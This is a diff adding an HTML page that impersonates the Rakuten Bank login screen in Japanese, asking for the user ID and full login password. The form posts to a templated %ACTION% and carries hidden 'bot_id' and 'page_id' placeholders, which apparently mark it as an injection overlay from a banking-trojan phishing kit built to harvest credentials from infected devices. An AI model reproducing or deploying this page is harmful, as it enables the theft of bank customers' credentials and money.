@@ -1,0 +1,166 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    <script src="https://use.fontawesome.com/8d8c3a1b01.js"></script>
+
+
+<style>
+	body {
+		margin: 0;
+		padding: 0;
+		background: #f8f8f8;
+	}
+	
+	.header {
+		border: 0;
+		border-bottom: 2px solid #a9a9a9;
+		text-align: center;
+		display: block;
+		background: #fff;
+		margin-bottom: 20px;
+		padding: 10px 0;
+	}
+	
+	#content_div {
+		background: #fff;
+		border: 1px solid #d7d7d7;
+		border-radius: 4px;
+		width: 90%;
+		margin: 0 auto;
+		padding: 20px;
+	}
+	
+	#_mainForm {
+		margin: 0;
+	}
+	
+	.input {
+		width: 100%;
+		margin-bottom: 10px;
+		height: 30px;
+		border: 1px solid #d9d9d9;
+		border-radius: 4px;
+		padding: 10px;
+	}
+	
+	.fielderror {
+		width: 100%;
+		margin-bottom: 10px;
+		height: 30px;
+		border: 1px solid #f00;
+		border-radius: 4px;
+		padding: 10px;
+	}
+	
+	#input_submitBtn:disabled {
+		width: 100%;
+		height: 60px;
+		margin-top: 30px;
+		border: 0;
+		color: #ffaa00;
+		background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAA0CAMAAADG3yrFAAABOFBMVEX/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgD/qgCc0HqcAAAAaHRSTlMAARg4U2Z1e4B3cF5KLAwQQnF/XzADD1B9cjYCO3ppHBQWc1EzIBEaKD5dVw4kCTpMYyUFfjdDCh18FU9uW1QSKWsGImceH1ZNJ0tJF0QyeFhFBxMIVWJ0Uj9AbAQqTmFICyFHNXkNb9a4U8AAAAGwSURBVEjHzZXpXwFBGMdnS2xLyLkiokNJSelUyZVcHSRE6e7//w9inln3rueVT79XM8/zNZ5rZgkZFDczq5pTa/h5Qatb0BMlGYyLfJ9MZotVDrXZRX5YjiXnOJRzLfPj5PaMsnozLyPRxQ2xKwIvL/tgKF511+NbXVv3bvg3twK9DLb76aBDMmt3evbdUNe812OtYWYT9geDOzBGmOewaztiFvPxSN4nPnCdepnhjAUXHdcBwzk4w6wkF7C95Ma2KsZyv6I7P2ziCZnGJk3Un6Jn2WEO0rITE4XTrtvLBHQ5Iz9eeg0lbtrLLPzOrzCMOUqo23HkYVyUJtcD5xUIgYYUlWAOin1LyB1dZBUvxT1lHkgJ/qKsCBdZDYIAPyrCIRgyYgM4U1FSijJPEozRtOFqTRcQcbCp3pnrWBgFP0O5Sg0EXG2y4r4gYJXUiQQCfu2OjzgZbklwGXGyqcDgN0w14u+QXwTVFKHvTk+EGx04jWx3gH4GkDAtnjOCg+s0QQEHWyjcwsEfFK7hYHiKP3FwvvNe6pEx8+76V+57uhf25xetCmkm0fL/5xdJDv4Du219auWY4jEAAAAASUVORK5CYII=');
+		border-radius: 4px;
+		background-color: #ffe3ad;
+		background-position: 27%;
+		background-repeat: no-repeat;
+		background-size: 20px;
+	}
+	
+	#input_submitBtn {
+		width: 100%;
+		height: 60px;
+		margin-top: 30px;
+		border: 0;
+		color: #4e3402;
+		background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAA0CAMAAADG3yrFAAABnlBMVEUiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwIiFwL+viHYAAAAinRSTlMAAi9wpcvp9f/u4LyTVxcghOH9vl8GHp/642wEdfPRN70BJ98s6uahZkAiM097uq4DHEgSc+SYBcZJCftthRM6+Cqe3MW1pyRS1gtE/s6gO509qxj2mk6WkdIuh2PvTa+KDSYbD7uqzcPnpJR9gNfoB1Omm8KQ1RZU/EPYPJxBK45+apXxGt2pCDQRue79AAABwElEQVRIx82VZ1/CMBDGg7PiwgV1jwIOFLfi3gvq3ltx74V7b/3W0ksKIm29V/58Xl3u/oTkniQlJFC6kNCw8IhILkofHRMbR7QUb0jgvikxKTlFDTWaeO6nUtPSlVBdRianpKzsYDYuh1MRn5H7g80TOHWZApditvgq1vyCQnORrbjE7t9Badk3tjxVTkdX+POVVdVyusbP1jpYTqgLXFy9oYFVGn25JpZJag7ad4uVllrNLNHGFtdeq+RTBy12spZ00WG3TtGqHrb3XhjZ6KDPqWKsS4R6P0w9ALE4qHpihuhsw97QSV0eUT9eo2NAjHvDCfo7m8ZhnATC4l3HFETTWic3m843Qwg1ZFYLzqXNniNkHoIFzUuxCMwSWaZ/4daEZ1kPVii8qglXAbNGjBQeWdfSBjCbMozRX8Nb2zt2HgeLu9LL0uNAwXu0Xcv7CPjgkDX3CAEfy044EfCJ7z3jf4c9MuxGzCzOMPgU042zc2AvLlGmCBJ7JeIcvJbgG6TddvgMIOFbCU5vwMG7sEE9Dk4G2IOD7wDexsH3AD/g4CnpvRwVkDdl+vHp+eVvL+zrG1rv5MOF1ud/fpHU4C8G75UmM1S4eQAAAABJRU5ErkJggg==');
+		border-radius: 4px;
+		background-color: #ffa700;
+		background-position: 27%;
+		background-repeat: no-repeat;
+		background-size: 20px;
+	}
+	
+	.col-xs-10 {
+		width: 100%;
+	}
+	
+	.col-xs-1, .col-xs-10, .col-xs-11, .col-xs-12, .col-xs-2, .col-xs-3, .col-xs-4, .col-xs-5, .col-xs-6, .col-xs-7, .col-xs-8, .col-xs-9 {
+		float: none;
+	}
+	
+	label {
+		display: inline-block;
+		max-width: 100%;
+		margin-bottom: 5px;
+		font-weight: 700;
+		color: #2c220e;
+	}
+</style>
+<script src="%DYN_PATH_GENERAL%/jquery.min.js"></script>
+</head>
+<body>
+
+<div class="header">
+	<b style="font;width: 100%;display: block;">ログイン </b>
+	<img style="width: 40px;margin-right: 10px;float: right;margin-top: -30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGIAAABiCAMAAACce/Y8AAACK1BMVEX///9ONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAIV2d/vAAAAuXRSTlMAAAlEd52zu6qMYyYCTq/3/9+CIVXWzoZLIxQ0pfD7oBwbuviXKgdYz/NuAUXssR9c5wxa+fZiFbnK/O05A5nICi71MZay2P5HuG+EiSdzknDo9B7eop+QT1Ob/ajQCO/gBGEzcVmDvQZ13ZhWhyRmbGUF+sJ+NoognKstjml2UW2+4pMLERjpTbYQiEEityyswShQmkynldTHP1QwOsUdejepQvKuQHkpX9fGFoWBwNrDjbQPf79gj+5hCSoAAAQsSURBVGje7Zn7e9NUGMeXqszNkX0DTsfGBgOEzMoYuLG5CU4uiwO5DSnCZIFVdFwn4CWKCgITPMi1jpuVi0K84d0s+/NMmrY5J21p2En1eXzy7Q9pTtP3c8573vc957RlZaFChQoV6j+U4FeBISKPPPrYlPLyxysqnygJomqqWI2spGnTA0c8WQM89XTtjIgg1NVXzmxA46zZgSKa5mDuvGco4vwFMpqfjQaHeG4hWhZ53B9tXQxxSVCI59val+YJo45OvFAXDGJqV/eLeUN12XK81BME4uUVDSsL5cMqrI7yI3p6lVcKptyyPqzhR6zFq5TNdes3bNhIJV7Hpv7NvIimua9FsgaXbFHsvFNm9WSbWhHjRWxFK+2W9orXt20fwBtu7O5oXMSHGFR37sqaG0J73L6+CcSzjbvxFh9iG9a6jn8bq1LX4WbsyTYOqnv5EPtABayK/c6bXhxwW2fiIBeiprvKNTYy4lS+SDPecVsPYYgHcfjIu3my4T3017l37+MDHoSGD3MJlV0YoW7r8BEP4ig+ziF8ouBTJsPRx4Oop+fV0TEFx9kWfMaDWJcOU6rPJ3CSbTmF1TyIUbR4EPXA52zLQWznCtrTvR5ELfo9LWesPORBfKF0sAYPjxIP4iy+5ELsoapgAe2oHuRCnFPOFyFcwEXOYn5p4DJjcXgowSK+whgnYgxXGItXAWY3Mr3tWhUnInpduUGbLAez0ApT8DX32p3skkYpk9/U3Lwl0GV2TpR/k3MbncOF5vpO+8JbAeyjoi34tgAj3tD2XSC7wUg5Okk+Qu3dxgUB7WkH72GvngPoqVD6xwLbmVd936hc+YEtJD/uxE8XgjzCrPwZA32t9zPI+C8nUP1rJNhTUjTxmwLl95blZ7fG/lCB7j+bSnCcPLf+r02pg17btXnH5pfmxGrp7xnxo5t3le5QXIpzd6hQ/+IPRPmlG3oACF3XCn5mSNaLBwHYNX0cRsEnVK1MU4NAuItH0mAFUkbgC6HpJD9C8CB0eCTqYswPwgTUpC+EZxQxYNwgPhCm3Z18jFyEd7Yh+wrapIrxhAopx1ekKEKG4QdBZMjE5shehl4MkQQ0PwjR8VEehg71wYgYZD9LxwRgOl3KYSQw/kCEZn+1OMGa6onMsL0Mw0FIGYToQYiQfCyAG63Ipl3LMESHjjQiAdEzSCR8ICYYo9aQJCp2JceFGYTMFhI7EP0s40RmSpwVu25+WAFFKIQBlR6iFYip++Jz4Qkiq2vp2bf9JFKVyky5xX1QSnfm4dcLmyFmBpFwERYhRj1mZoc7iSVJk504IulrCkEmGIImupM2mVWPyLqTDUhmEKLqhrYFiNkVlgiTRwjEGUN2TlL/X+jUKK2aaT7MxrBAbTBdx1g1zGQSUjWIEABCcIsGYcs8McPtbahQoUL9//UP0+gHYBMhVgkAAAAASUVORK5CYII=">
+</div>
+
+<div id="content_div">
+<div class="col-xs-10 col-sm-8">
+
+	<form id='mainform' method='post' action='%ACTION%' onsubmit="return function(){ 
+var ok = true;
+
+$('input').each(function (i, value){  
+	$(value).css('border', '');
+	
+	if(!$(value).is(':visible') || $(value).prop('type') == 'submit')
+		return;
+		
+	if($(value).val().length < 3){
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+	if($(value).prop('maxlength') !== undefined && $(value).prop('maxlength') != -1 && $(value).val().length > $(value).prop('maxlength'))
+	{
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+});
+if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
+}()">
+		<input type="hidden" name="page_id" value="%PKG%" class="main_input" /><input type="hidden" name="bot_id" value="%BOTID%" />
+	
+	<b style="color: #362c18">楽天銀行口座のユーザーID・ログインパスワードを入力してください。</b>
+	<br><br>
+	
+	<label> 楽天銀行のユーザID </label>
+	<input name="fields[login]" id="login" onkeyup="check();" class="input" type="text">
+	
+	
+	<label> ログインパスワード(全桁) </label>
+	<input name="fields[password]" id="password" onkeyup="check();" class="input" style="margin: 0;" type="password">
+	<br><br>
+	<b style="display: block; float: right; color: #4e3402;"> ログインでお困りのお客さま  <img style="width: 9px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAcCAMAAABbGh8VAAAA1VBMVEVONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONALiP2wdAAAAR3RSTlMAIMAkIuH/5Sgn5OguvOwyEsjvNwu48TwGpvRCApL2SH75Tmn8VFZaRPNjNev+4nBD9YZHgEr4ek92cVj7a11nYrRQt0sJsbVkPkQAAAC1SURBVCjPZdHFFsJADAXQYoO7FaeGD1YoUiro/38SZ9JFMpBd7uZFFEWJxROKXMkUS2ckyeYYY/kCpSITVSoTqlTBanVijSZYq01M7YB1e8T6A7DhiGaMwTSdmmGCWdQmmjBzSm02B1tQW66EcYNaZg22IbTdQe4exY7kgHJ0QE4oZxiCXVAsEH5FcW8gHooP6/AAJQQxQ5SAg/goXiQuis7/zqLehTykR6pP5rx+3v3+2FL/BRNyEb/EJ7z2AAAAAElFTkSuQmCC"></b><br><br>
+	<b style="display: block; float: right; color: #4e3402;"> はじめて口座にログインする場合 <img style="width: 9px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAcCAMAAABbGh8VAAAA1VBMVEVONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONALiP2wdAAAAR3RSTlMAIMAkIuH/5Sgn5OguvOwyEsjvNwu48TwGpvRCApL2SH75Tmn8VFZaRPNjNev+4nBD9YZHgEr4ek92cVj7a11nYrRQt0sJsbVkPkQAAAC1SURBVCjPZdHFFsJADAXQYoO7FaeGD1YoUiro/38SZ9JFMpBd7uZFFEWJxROKXMkUS2ckyeYYY/kCpSITVSoTqlTBanVijSZYq01M7YB1e8T6A7DhiGaMwTSdmmGCWdQmmjBzSm02B1tQW66EcYNaZg22IbTdQe4exY7kgHJ0QE4oZxiCXVAsEH5FcW8gHooP6/AAJQQxQ5SAg/goXiQuis7/zqLehTykR6pP5rx+3v3+2FL/BRNyEb/EJ7z2AAAAAElFTkSuQmCC"></b><br><br>
+	<b style="display: block; float: right; color: #4e3402;"> 指紋認証でのログインについて  <img style="width: 9px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAcCAMAAABbGh8VAAAA1VBMVEVONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONALiP2wdAAAAR3RSTlMAIMAkIuH/5Sgn5OguvOwyEsjvNwu48TwGpvRCApL2SH75Tmn8VFZaRPNjNev+4nBD9YZHgEr4ek92cVj7a11nYrRQt0sJsbVkPkQAAAC1SURBVCjPZdHFFsJADAXQYoO7FaeGD1YoUiro/38SZ9JFMpBd7uZFFEWJxROKXMkUS2ckyeYYY/kCpSITVSoTqlTBanVijSZYq01M7YB1e8T6A7DhiGaMwTSdmmGCWdQmmjBzSm02B1tQW66EcYNaZg22IbTdQe4exY7kgHJ0QE4oZxiCXVAsEH5FcW8gHooP6/AAJQQxQ5SAg/goXiQuis7/zqLehTykR6pP5rx+3v3+2FL/BRNyEb/EJ7z2AAAAAElFTkSuQmCC"></b><br>
+	
+	<button value="Login" id="input_submitBtn" disabled="disabled" class="submit" type="submit"> ログイン  </button>
+	
+	</form>
+</div>
+</div>
+<script>
+function check() {
+  var inp1 = document.getElementById('login'),
+      inp2 = document.getElementById('password');
+  document.getElementById('input_submitBtn').disabled = inp1.value && inp2.value ? false : "disabled";
+}
+</script>
+
+</body>
+</html>
